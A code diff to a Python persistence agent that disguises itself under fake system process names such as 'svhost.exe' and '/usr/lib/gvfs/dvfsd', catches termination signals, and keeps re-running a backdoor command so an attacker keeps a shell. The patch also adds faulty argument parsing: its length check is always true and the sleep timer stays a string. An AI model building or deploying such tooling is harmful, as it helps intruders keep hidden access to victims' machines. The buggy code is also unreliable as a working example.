@@ -1,30 +1,26 @@
 #!/usr/bin/env python
-import os
+import os, sys
 import signal
-from argparse import ArgumentParser
 from time import sleep
 
 LINUX_DISGUISE_PROCESS_NAMES = ['init2', 'login', '/usr/lib/gvfs/dvfsd', '/usr/lib/ibus/ibus-dconf']
 WINDOWS_DISGUISE_PROCESS_NAMES = ['winmanager.exe', 'svhost.exe', 'wmi.exe', 'logon.exe']
+DEFAULT_SLEEP_TIMER = 30
 
 
 def get_arguments():
-    parser = ArgumentParser(
-                description="Use this script to create a tiny agent that will periodically rerun your --cmd command, "
-                            "so you won't lose your shell anymore.")
-    parser.add_argument('--sleep',
-                        dest='sleep',
-                        default=30,
-                        required=False,
-                        help='Sleep timer in seconds. This timer specifies how often the given --cmd command runs. '
-                             '60 == 1min, 3600 == 1hour')
-    parser.add_argument('--cmd',
-                        dest='cmd',
-                        required=True,
-                        help='Command to use, in the following format: '
-                             '"C:\\WINDOWS\\system32\\backdoor.exe"')
-    options = parser.parse_args()
-    return options
+    if len(sys.argv) != 2 or len(sys.argv) != 3:
+        print("Use this script to create a tiny agent that will periodically rerun your cmd command "
+              "with a specified sleep timer, so you won't lose your shell anymore.")
+        print("Usage: " + sys.argv[0] + " 30 " + '"C:\\WINDOWS\\system32\\backdoor.exe"')
+        print("Usage: " + sys.argv[0] + " " + '"C:\\WINDOWS\\system32\\backdoor.exe"')
+    sleep_timer = sys.argv[1]
+    if not sleep_timer:
+        sleep_timer = DEFAULT_SLEEP_TIMER
+        cmd = sys.argv[1]
+    else:
+        cmd = sys.argv[2]
+    return sleep_timer, cmd
 
 
 def handle_signal(signal_number, frame):
@@ -52,7 +48,5 @@ signal.signal(signal.SIGTERM, handle_signal)
 signal.signal(signal.SIGSEGV, handle_signal)
 
 # 2 - START THE AGENT
-options = get_arguments()
-cmd = options.cmd
-sleep_timer = int(options.sleep)
+sleep_timer, cmd = get_arguments()
 work_forever(cmd, sleep_timer)
